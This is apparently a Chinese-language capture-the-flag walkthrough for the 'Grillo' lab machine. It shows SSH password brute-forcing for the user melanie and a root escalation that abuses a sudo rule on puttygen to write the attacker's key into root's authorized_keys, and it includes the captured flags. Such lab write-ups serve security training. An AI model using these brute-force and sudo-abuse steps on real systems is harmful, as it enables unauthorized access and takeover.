# Grillo

2025.03.08 https://thehackerslabs.com/grillo/

## Ip

192.168.5.40

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

80 底部显示: Cambia la contraseña de ssh por favor melanie -> 请更改 ssh 密码 melanie

melanie 可能是弱密码，进行爆破：

```
[22][ssh] host: 192.168.5.40   login: melanie   password: trustno1
```

拿到 user flag：

```
melanie@grillo:~$ cat user.txt
9fe2028a405f33a6dae75e4c60c78f82
```

sudo -l 显示 (root) NOPASSWD: /usr/bin/puttygen 可以将自己的公钥导入到 /root/.ssh/authorized_keys 文件中：

```
cd ~
ssh-keygen
sudo /usr/bin/puttygen id_rsa.pub -O public-openssh -o /root/.ssh/authorized_keys
```

登陆 root，拿到 flag：

```
root@grillo:~# cat root.txt
914ea930fea11076f641cc3970187d29
```
